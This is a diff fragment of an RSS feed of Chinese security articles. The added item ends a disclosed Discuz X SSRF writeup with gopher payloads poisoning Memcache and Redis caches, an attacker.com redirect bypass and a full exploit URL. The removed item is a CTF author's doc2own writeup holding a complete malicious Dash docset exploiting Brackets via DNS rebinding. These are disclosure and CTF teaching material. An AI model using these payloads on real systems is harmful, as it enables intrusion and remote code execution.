+$memcache-&amp;gt;connect(&#39;localhost&#39;, 11211) or die (&quot;Could not connect&quot;);
+$memcache-&amp;gt;set(&#39;IwRW7l_setting&#39;, $_G[&#39;setting&#39;]);&lt;/code&gt;&lt;p&gt;运行这段 PHP 代码，同时抓包，然后将数据包改成 gopher 的形式，即：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;gopher://localhost:11211/_set%20IwRW7l_setting%201%200%20161%0d%0aa%3A2%3A%7Bs%3A6%3A%22output%22%3Ba%3A1%3A%7Bs%3A4%3A%22preg%22%3Ba%3A2%3A%7Bs%3A6%3A%22search%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A4%3A%22%2F.*%2F%22%3B%7Ds%3A7%3A%22replace%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A9%3A%22phpinfo()%22%3B%7D%7D%7Ds%3A13%3A%22rewritestatus%22%3Bi%3A1%3B%7D&lt;/code&gt;&lt;p&gt;但是直接用它去 SSRF 是不可以的，会被&lt;code class=&quot;inline&quot;&gt;_xss_check&lt;/code&gt;检测到特殊字符而被拒绝请求：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-89e49e7e6e1b503f37268926e59fa072_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2094&quot; data-rawheight=&quot;966&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-89e49e7e6e1b503f37268926e59fa072&quot; data-watermark-src=&quot;v2-73b6cedf186352e00466852500931c0c&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;所以利用这里请求跟随跳转的特点，在自己的远程服务器上放类似于这样的一个脚本：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;?php
+
+$url = base64_decode($_REQUEST[&#39;url&#39;]);
+header( &quot;Location: &quot; . $url );&lt;/code&gt;&lt;p&gt;这样就可以将 SSRF URL 进行 base64 编码从而规避&lt;code class=&quot;inline&quot;&gt;_xss_check&lt;/code&gt;的检测。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://target/plugin.php?id=wechat:wechat&amp;amp;ac=wxregister&amp;amp;username=vov&amp;amp;avatar=http%3A%2F%2Fattacker.com%2F302.php%3Furl%3DZ29waGVyOi8vbG9jYWxob3N0OjExMjExL19zZXQlMjBJd1JXN2xfc2V0dGluZyUyMDElMjAwJTIwMTYxJTBkJTBhYSUzQTIlM0ElN0JzJTNBNiUzQSUyMm91dHB1dCUyMiUzQmElM0ExJTNBJTdCcyUzQTQlM0ElMjJwcmVnJTIyJTNCYSUzQTIlM0ElN0JzJTNBNiUzQSUyMnNlYXJjaCUyMiUzQmElM0ExJTNBJTdCcyUzQTclM0ElMjJwbHVnaW5zJTIyJTNCcyUzQTQlM0ElMjIlMkYuKiUyRiUyMiUzQiU3RHMlM0E3JTNBJTIycmVwbGFjZSUyMiUzQmElM0ExJTNBJTdCcyUzQTclM0ElMjJwbHVnaW5zJTIyJTNCcyUzQTklM0ElMjJwaHBpbmZvKCklMjIlM0IlN0QlN0QlN0RzJTNBMTMlM0ElMjJyZXdyaXRlc3RhdHVzJTIyJTNCaSUzQTElM0IlN0Q%253D&amp;amp;wxopenid=xxxyyy&lt;/code&gt;&lt;p&gt;再访问&lt;code class=&quot;inline&quot;&gt;/forum.php?mod=ajax&amp;amp;action=getthreadtypes&amp;amp;inajax=yes&lt;/code&gt;，即可看到&lt;code class=&quot;inline&quot;&gt;phpinfo()&lt;/code&gt;代码已被执行：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-ca0244ee736f19d51caedfdf36004da7_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2582&quot; data-rawheight=&quot;1462&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-ca0244ee736f19d51caedfdf36004da7&quot; data-watermark-src=&quot;v2-61894903db5590c7c8c1251e4b498219&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;由于缓存被暴力篡改，会导致网站无法正常运行。恢复正常办法是刷新缓存。用上面的思路直接一次 getshell 后执行以下命令，网站就可以恢复正常：&lt;/p&gt;&lt;code lang=&quot;bash&quot;&gt;echo -e &#39;flush_all&#39; | nc localhost 11211&lt;/code&gt;&lt;p&gt;最后我写了个将上述整个过程自动化 getshell 的脚本：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-3952b1f9cbacc62cbc64ca197b23983c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1200&quot; data-rawheight=&quot;514&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-3952b1f9cbacc62cbc64ca197b23983c&quot; data-watermark-src=&quot;v2-5dc509a6ec888cb6faecc0f2d1987412&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-3ff111646ab29d28ca0e83dfa1359515_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;580&quot; data-rawheight=&quot;380&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-3ff111646ab29d28ca0e83dfa1359515&quot; data-watermark-src=&quot;v2-405577e479bdba8da2c9dce19e91feff&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;SSRF 攻击 Redis&lt;/b&gt;&lt;/p&gt;&lt;p&gt;类似地，Dz 整合 Redis 配置成功后，默认情况下网站首页右下角会出现&lt;code class=&quot;inline&quot;&gt;Redis On&lt;/code&gt;的标志：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-38b8351402d3faa4c921b20723838c3d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;796&quot; data-rawheight=&quot;114&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;SSRF 攻击 Redis 步骤实际上就比攻击 Memcache 简单了，因为 Redis 支持 lua 脚本，可以直接用 lua 脚本获取缓存键名而无需再去猜解前缀。当然能成功攻击的前提是 Redis 没有配置密码认证，Discuz requirepass 那一项为空：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-33cd4ccebce220760348de8419512b17_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;724&quot; data-rawheight=&quot;220&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-33cd4ccebce220760348de8419512b17&quot; data-watermark-src=&quot;v2-dc5956c6a43821a0a6383d62f810ef58&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;Redis 交互命令行执行 lua 脚本：&lt;/p&gt;&lt;code lang=&quot;lua&quot;&gt;eval &quot;local t=redis.call(&#39;keys&#39;,&#39;*_setting&#39;); for i,v in ipairs(t) do redis.call(&#39;set&#39;, v, &#39;a:2:{s:6:\&quot;output\&quot;;a:1:{s:4:\&quot;preg\&quot;;a:2:{s:6:\&quot;search\&quot;;a:1:{s:7:\&quot;plugins\&quot;;s:4:\&quot;/.*/\&quot;;}s:7:\&quot;replace\&quot;;a:1:{s:7:\&quot;plugins\&quot;;s:9:\&quot;phpinfo()\&quot;;}}}s:13:\&quot;rewritestatus\&quot;;i:1;}&#39;) end; return 1;&quot; 0&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d7dcf11173196ded7d866083ebf8019c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1434&quot; data-rawheight=&quot;180&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;同样地，对这个过程抓包，将数据包改成 gopher 的形式：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;gopher://localhost:6379/_*3%0d%0a%244%0d%0aeval%0d%0a%24264%0d%0alocal%20t%3Dredis.call(&#39;keys&#39;%2C&#39;*_setting&#39;)%3B%20for%20i%2Cv%20in%20ipairs(t)%20do%20redis.call(&#39;set&#39;%2C%20v%2C%20&#39;a%3A2%3A%7Bs%3A6%3A%22output%22%3Ba%3A1%3A%7Bs%3A4%3A%22preg%22%3Ba%3A2%3A%7Bs%3A6%3A%22search%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A4%3A%22%2F.*%2F%22%3B%7Ds%3A7%3A%22replace%22%3Ba%3A1%3A%7Bs%3A7%3A%22plugins%22%3Bs%3A9%3A%22phpinfo()%22%3B%7D%7D%7Ds%3A13%3A%22rewritestatus%22%3Bi%3A1%3B%7D&#39;)%20end%3B%20return%201%3B%0d%0a%241%0d%0a0%0d%0a&lt;/code&gt;&lt;p&gt;SSRF 利用：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://target/plugin.php?id=wechat:wechat&amp;amp;ac=wxregister&amp;amp;username=vov&amp;amp;avatar=http%3A%2F%2Fattacker.com%2F302.php%3Furl%3DZ29waGVyOi8vbG9jYWxob3N0OjYzNzkvXyozJTBkJTBhJTI0NCUwZCUwYWV2YWwlMGQlMGElMjQyNjQlMGQlMGFsb2NhbCUyMHQlM0RyZWRpcy5jYWxsKCdrZXlzJyUyQycqX3NldHRpbmcnKSUzQiUyMGZvciUyMGklMkN2JTIwaW4lMjBpcGFpcnModCklMjBkbyUyMHJlZGlzLmNhbGwoJ3NldCclMkMlMjB2JTJDJTIwJ2ElM0EyJTNBJTdCcyUzQTYlM0ElMjJvdXRwdXQlMjIlM0JhJTNBMSUzQSU3QnMlM0E0JTNBJTIycHJlZyUyMiUzQmElM0EyJTNBJTdCcyUzQTYlM0ElMjJzZWFyY2glMjIlM0JhJTNBMSUzQSU3QnMlM0E3JTNBJTIycGx1Z2lucyUyMiUzQnMlM0E0JTNBJTIyJTJGLiolMkYlMjIlM0IlN0RzJTNBNyUzQSUyMnJlcGxhY2UlMjIlM0JhJTNBMSUzQSU3QnMlM0E3JTNBJTIycGx1Z2lucyUyMiUzQnMlM0E5JTNBJTIycGhwaW5mbygpJTIyJTNCJTdEJTdEJTdEcyUzQTEzJTNBJTIycmV3cml0ZXN0YXR1cyUyMiUzQmklM0ExJTNCJTdEJyklMjBlbmQlM0IlMjByZXR1cm4lMjAxJTNCJTBkJTBhJTI0MSUwZCUwYTAlMGQlMGE%253D&amp;amp;wxopenid=xxxyyyzzz&lt;/code&gt;&lt;p&gt;代码即再次执行成功。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;修复补丁&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/41eb5bb0a3a716f84b0ce4e4feb41e6f25a980a3&quot;&gt;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/41eb5bb0a3a716f84b0ce4e4feb41e6f25a980a3&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Dz 参照了 WordPress 中的做法，对 url 的请求协议、端口做了白名单检查，并限制了请求 IP 地址不能为除了 localhost 以外的其他内网段地址，更重要的是不再跟随跳转。因此无法再通过 SSRF 利用 gopher 协议攻击 Dz 的缓存服务了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;时间线&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;2018/03/23：向 TSRC 报告两处 SSRF&lt;/li&gt;&lt;li&gt;2018/03/26：TSRC 确认漏洞存在，并准备进行漏洞修复&lt;/li&gt;&lt;li&gt;2018/04/09 - 2018/08/01：协助 TSRC 进行漏洞修复&lt;/li&gt;&lt;li&gt;2018/11/06：DiscuzX 在 gitee 上提交补丁 commit&lt;/li&gt;&lt;li&gt;2018/12/09：公开漏洞详情&lt;/li&gt;&lt;/ul&gt;</description>
+<author>voidfyoo</author>
+<guid isPermaLink="false">2018-12-09-51907363</guid>
+<pubDate>Sun, 09 Dec 2018 00:00:00 +0800</pubDate>
+</item>
 <item>
 <title>史上最强国际CTF战队集结中国，48小时王者之战即将开启！</title>
 <link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-11-26-50860117.html</link>
@@ -526,57 +719,6 @@ cd sqlmap&lt;/code&gt;&lt;p&gt;进入 sqlmap 的 repos 下，直接打开编辑�
 <author>婴宁</author>
 <guid isPermaLink="false">2018-08-29-43242220</guid>
 <pubDate>Wed, 29 Aug 2018 00:00:00 +0800</pubDate>
-</item>
-<item>
-<title>Real World CTF doc2own 命题报告</title>
-<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-08-08-41544965.html</link>
-<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/41544965&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
-&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-45dff9e7b0164cc42ef97d36d70acc61_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;本文作者：咸鱼&lt;/p&gt;&lt;p&gt;上个月的 realdworldctf 设计了一个完全真实的客户端软件 pwn 题目。&lt;/p&gt;&lt;p&gt;在接到出题邀请的时候也差点要“另请高明”了。当时正好在准备 &lt;a href=&quot;https://zhuanlan.zhihu.com/p/21776300&quot;&gt;LoCCS 的暑期学校&lt;/a&gt;的课件，因为拖延搞得讲课前夜通宵没睡狂写 ppt，紧接着又安排出差，趁着飞机延误之类的边角时间写评测环境和测试 exploit 之类，最后还是在比赛已经开始的情况下才在第一个晚上把稳定性堪忧的环境部署上线。&lt;/p&gt;&lt;p&gt;仓促的出题过程也是埋下了伏笔。竟然在比赛过程中，先后有几支国际队伍交上了真正的 0day 利用。而赛后我简单反编译了程序，还发现了更多的远程代码执行问题。&lt;/p&gt;&lt;p&gt;&lt;b&gt;由于补丁今天刚刚发布，在这里我不会公开相关漏洞的细节。&lt;/b&gt;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;在年初我偶然发现了一个 Visual Studio Code 的远程代码执行漏洞，而报告后发现被撞洞了。这个问题是 Electron 使用了 Chromium 的远程前端调试协议，是基于 http 和 WebSocket 的。&lt;/p&gt;&lt;p&gt;攻击者在知道调试端口的情况下，可以使用 dns 重绑定的技巧获得一个随机的 uuid，构造一个 WebSocket 协议的 url，向 Electron 的前端注入任意代码，实现 node.js 任意代码执行。&lt;/p&gt;&lt;p&gt;VSCode 在部分版本中意外开启了 Extension 进程的调试端口，只要浏览一个网页并停留数十秒（dns rebinding 需要一段时间让旧 dns 记录失效），计算机便可被远程控制：&lt;/p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//medium.com/0xcc/visual-studio-code-silently-fixed-a-remote-code-execution-vulnerability-8189e85b486&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot;&gt;Visual Studio Code silently fixed a remote code execution vulnerability&lt;/a&gt;&lt;p&gt;受此启发我在 Adobe Brackets 上发现了完全一致的漏洞：&lt;/p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/adobe/brackets/issues/14149&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot;&gt;CEF remote debugging is vulnerable to dns rebinding attack #14149&lt;/a&gt;&lt;p&gt;与 VSCode 不同的是，Adobe Brackets 没有使用 Electron，而是自行封装的 libCEF 框架，与 node.js 的集成方式也不同。Electron 可以在 window 的上下文中访问 node.js API，而 Brackets 的编辑器前端则没有提供这个功能，尽管 Brackets 当中使用到了 node.js 运行时。&lt;/p&gt;&lt;p&gt;不过 Brackets 在上下文中暴露了如下的两个对象：brackets 和 appshell&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f1387cef8bb0e11e95bd04389228fc2f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1612&quot; data-rawheight=&quot;834&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-f1387cef8bb0e11e95bd04389228fc2f&quot; data-watermark-src=&quot;v2-2cfaacf85c79d72c0eb08060a3756933&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;这两个对象封装了文件系统和 shell 相关的功能。虽然我们不能 require(&#39;child_process&#39;)，但是通过 appshell.fs 可以实现任意文件读写。到文件读写这一步其实已经可以拿 flag 了，当然一开始我们没有给出 flag 的路径，还是反弹一个 shell 比较靠谱。覆盖可执行文件加上额外的触发条件即可实现远程代码执行。&lt;/p&gt;&lt;p&gt;在 Brackets 的扩展接口中，我找到了如下两个与系统 shell 相关的方法：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;brackets.app.openURLInDefaultBrowser&lt;/li&gt;&lt;li&gt;brackets.app.showOSFolder&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;前者支持打开 file:/// 域名，在 Windows 下相当于 ShellExecute，打开一个 .cmd 或者 .exe 即可执行代码；而 showOSFolder 在 macOS 下的表现是，如果文件夹是一个有效的 .app bundle，那么等同于双击 .app，也就是运行。如果你不太明白，那么请尝试在终端中执行&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;find /Applications/Calculator.app
-open /Applications/Calculator.app&lt;/code&gt;&lt;p&gt;因此我们先判断平台差异，通过 appshell.fs 创建可执行文件，然后调用对应的方法即可运行：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;function calc() {  // use brackets.fs to write your own executable  // makedir, writeFile, chmod are your friends  if (brackets.app.getUserDocumentsDirectory().indexOf(&#39;/&#39;) === 0) {    brackets.app.showOSFolder(&#39;/Applications/Calculator.app&#39;);  } else {    brackets.app.openURLInDefaultBrowser(&#39;file:///C:/windows/system32/calc.exe&#39;);  }}&lt;/code&gt;&lt;p&gt;到这里即可实现与 VSCode 之前的 bug 完全一致的效果，通过 dns 重绑定攻击本地端口实现远程代码执行。在我之前的漏洞报告后，libCEF 参考 node.js 和 Electron 的做法修复了 dns 重绑定的问题。但是最新版 Brackets 的这个端口仍然可以从 localhost 访问。&lt;/p&gt;&lt;hr&gt;&lt;p&gt;为什么盯上了 Dash 呢？&lt;/p&gt;&lt;p&gt;Dash 可以说是以 macOS 为主力开发环境的程序员当中很受欢迎的一款工具了，主要功能就是离线看文档。文档是一个后缀为 docset 的 bundle 文件夹，存放 html 资源和索引数据库等。&lt;/p&gt;&lt;p&gt;它具有两个攻击面，一个是展示文档时用的是 WebView，另一个是在打开文档的时候会启用一个内置的 GCDWebServer 来启动一个 http 服务，可通过其他计算机访问。&lt;/p&gt;&lt;p&gt;macOS 上的 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//developer.apple.com/documentation/webkit/webview%3Flanguage%3Dobjc&quot;&gt;WebView&lt;/a&gt; 和 iOS 的 UIWebView 在很多方面是一样的：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;没有进程隔离和 sandbox&lt;/li&gt;&lt;li&gt;在 file:/// 域下的文件默认具有 AllowUniversalAccessFromFileURLs 和 AllowFileAccessFromFileURLs 的 UXSS 能力&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;在之前版本的 Dash 就可以通过一个恶意的 docset，以 XMLHttpRequest 的方式读取并上传本地文件（例如 ssh 公私钥）的内容。在 3.x 的某一个版本（具体不详）中增加了限制，如果访问的文件在 docset 目录之外会失败。但这个版本可以使用在压缩包中添加符号链接的方式绕过（由于 docset 是文件夹，通常的分发方式是使用 tar.gz 包）。此外符号链接的问题同样影响 Dash 内置的 http 服务。&lt;/p&gt;&lt;p&gt;经过报告后修复了本地文件泄露的问题，这也为出题提供了一个绝佳的条件——这是个允许跨域请求，却又不能简单 AJAX 读本地文件的环境，选手必须实现实质性的远程代码执行。最后这个 WebView 和系统内置 Safari 的 WebKit 是一致的，避免选手使用已公开的浏览器漏洞利用代码来获得权限。至于打 ctf 用 Safari 0day？疯了吗。&lt;/p&gt;&lt;hr&gt;&lt;blockquote&gt;&lt;b&gt;doc2own&lt;/b&gt; ( Points: 425, Solved by 4 Teams )&lt;br&gt;I have to fix these issues during the flight. Since that airline does not provide Internet, I have to download some documents for offline use.&lt;br&gt;&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//34.236.229.208%3A8080&quot;&gt;http://34.236.229.208:8080&lt;/a&gt;&lt;br&gt;Hint : It’s a pwnable game. You really need to achieve RCE to get the flag.&lt;/blockquote&gt;&lt;p&gt;题目设定的剧情就是一个像我一样的信息技术底层劳动力，在出差的路上需要修 bug，又没网，只能下一个离线文档备用。而这时候下到了不干净的文档，于是电脑中招了。&lt;/p&gt;&lt;p&gt;217 战队按照预期的解法做了出来。&lt;/p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//blog.l4ys.tw/2018/07/realworld-ctf-2018-doc2own/&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot;&gt;https://blog.l4ys.tw/2018/07/realworld-ctf-2018-doc2own/&lt;/a&gt;&lt;p&gt;在这里附上我自己调试通过的一个解法，生成一个 docset，在 Brackets 运行的情况下打开会弹出一个计算器&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;contents=exploit.docset/Contentsdocs=$contents/Resources/Documents
-
-rm -r $contentsmkdir -p $docs
-cat &amp;gt; $docs/index.html &amp;lt;&amp;lt;- &quot;EOF&quot;&amp;lt;script&amp;gt;
-async function main() {  const list = await fetch(&#39;http://localhost:9234/json&#39;).then(r =&amp;gt; r.json());  const item =  list.find(item =&amp;gt; item.url.indexOf(&#39;file:///&#39;) === 0);  if (!item) return console.error(&#39;invalid response&#39;);  const url = `ws://127.0.0.1:9234/devtools/page/${item.id}`;  console.log(&#39;url:&#39; + url);  exploit(url);}function exploit(url) {  function calc() {    const fs = window.appshell.fs;    const mkdir = path =&amp;gt; new Promise((resolve, reject) =&amp;gt;
-      fs.makedir(path, 0755, err =&amp;gt; err =&amp;gt; err === 0 ? resolve(true) : reject(err)));    const writeFile = (path, content) =&amp;gt; new Promise((resolve, reject) =&amp;gt;
-      fs.writeFile(path, content, &#39;utf8&#39;, false, err =&amp;gt; err === 0 ? resolve(true) : reject(err)));    const chmod = (path, mode) =&amp;gt; new Promise((resolve, reject) =&amp;gt;
-      fs.chmod(path, mode, err =&amp;gt; err === 0 ? resolve(true) : reject(err)));    const INFO_PLIST = `&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
-      &amp;lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;
-      &amp;lt;plist version=&quot;1.0&quot;&amp;gt;
-      &amp;lt;dict&amp;gt;
-        &amp;lt;key&amp;gt;CFBundleExecutable&amp;lt;/key&amp;gt;
-        &amp;lt;string&amp;gt;hello&amp;lt;/string&amp;gt;
-        &amp;lt;key&amp;gt;CFBundleIconFile&amp;lt;/key&amp;gt;
-        &amp;lt;string&amp;gt;AppIcon&amp;lt;/string&amp;gt;
-      &amp;lt;/dict&amp;gt;
-      &amp;lt;/plist&amp;gt;`;    const EXEC = `#!/bin/sh      open -a Calculator`;    const app = &#39;/tmp/test.app/&#39;;    const base = app + &#39;Contents/&#39;    return mkdir(base + &#39;MacOS&#39;)      .then(writeFile(base + &#39;Info.plist&#39;, INFO_PLIST))      .then(writeFile(base + &#39;MacOS/hello&#39;, EXEC))      .then(chmod(base + &#39;MacOS/hello&#39;, 0777))      .then(new Promise((resolve, reject) =&amp;gt; {        brackets.app.showOSFolder(app)      }));  }  const ws = new WebSocket(url);  ws.onopen = async () =&amp;gt; {    let counter = 13371337;    const send = (method, params) =&amp;gt; new Promise((resolve, reject) =&amp;gt; {      const id = counter++;      const recv = ({ data }) =&amp;gt; {        const parsed = JSON.parse(data);        if (parsed.id === id) {          resolve(parsed.result);          ws.removeEventListener(&#39;message&#39;, recv);        } else {          console.log(&#39;message: &#39;, data);        }      };      ws.addEventListener(&#39;message&#39;, recv);      ws.send(JSON.stringify({ id, method, params }));    });    const response = await send(&#39;Runtime.evaluate&#39;, { expression: `(${calc})()` });    console.log(response.result);    ws.close();  }  ws.onerror = () =&amp;gt; console.log(&#39;failed to connect&#39;);}main();&amp;lt;/script&amp;gt;
-EOF
-
-cat &amp;gt; $contents/Info.plist &amp;lt;&amp;lt;- &quot;EOF&quot;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
-&amp;lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;
-&amp;lt;plist version=&quot;1.0&quot;&amp;gt;
-&amp;lt;dict&amp;gt;
-  &amp;lt;key&amp;gt;CFBundleIdentifier&amp;lt;/key&amp;gt;
-  &amp;lt;string&amp;gt;exploit&amp;lt;/string&amp;gt;
-  &amp;lt;key&amp;gt;CFBundleName&amp;lt;/key&amp;gt;
-  &amp;lt;string&amp;gt;Exploit&amp;lt;/string&amp;gt;
-  &amp;lt;key&amp;gt;DocSetPlatformFamily&amp;lt;/key&amp;gt;
-  &amp;lt;string&amp;gt;exploit&amp;lt;/string&amp;gt;
-  &amp;lt;key&amp;gt;dashIndexFilePath&amp;lt;/key&amp;gt;
-  &amp;lt;string&amp;gt;index.html&amp;lt;/string&amp;gt;
-  &amp;lt;key&amp;gt;isDashDocset&amp;lt;/key&amp;gt;
-  &amp;lt;true/&amp;gt;
-&amp;lt;/dict&amp;gt;
-&amp;lt;/plist&amp;gt;
-EOF
-
-sqlite3 -batch $contents/Resources/docSet.dsidx &amp;lt;&amp;lt; &quot;EOF&quot;CREATE TABLE searchIndex(id INTEGER PRIMARY KEY, name TEXT, type TEXT, path TEXT);CREATE UNIQUE INDEX anchor ON searchIndex (name, type, path);INSERT OR IGNORE INTO searchIndex(name, type, path) VALUES (&#39;Exploit&#39;, &#39;Class&#39;, &#39;index.html&#39;);EOF
-
-open exploit.docset
-
-tar czf exp.tar.gz exploit.docset&lt;/code&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-9aed9f3c57895c564fc6c61b0437830f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;725&quot; data-rawheight=&quot;364&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9aed9f3c57895c564fc6c61b0437830f&quot; data-watermark-src=&quot;v2-ce59018ec0a4bbcde7976e3433c41c84&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;hr&gt;&lt;p&gt;但是出乎我意料的是，另外三支强队 PPP, CyKOR 和 ESPR 在短短的比赛期间内直接交上了两个不同的 0day 解法。赛后我向厂商整理漏洞报告，又快速浏览了一遍反汇编，又发现了另外的一些疑似远程代码执行问题（我没有做 poc，经过开发者自己确认存在）。&lt;/p&gt;&lt;p&gt;&lt;b&gt;Dash 作者接到报告之后非常迅速地推出了修复补丁，检查了线上的 Dash 文档仓库确保之前没有实质性的攻击，在更新日志中明确写明了安全漏洞的存在并对以上战队表示了致谢。应急响应做得非常不错。&lt;/b&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c1224d9312c077421d4def640a5263d5_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1244&quot; data-rawheight=&quot;1188&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-c1224d9312c077421d4def640a5263d5&quot; data-watermark-src=&quot;v2-8696ee455e323a6046252f1330f416cb&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;Dash 用户请尽快升级到 4.4.0 来修复这些问题。&lt;/p&gt;</description>
-<author>婴宁</author>
-<guid isPermaLink="false">2018-08-08-41544965</guid>
-<pubDate>Wed, 08 Aug 2018 00:00:00 +0800</pubDate>
 </item>
 </channel>
 </rss>
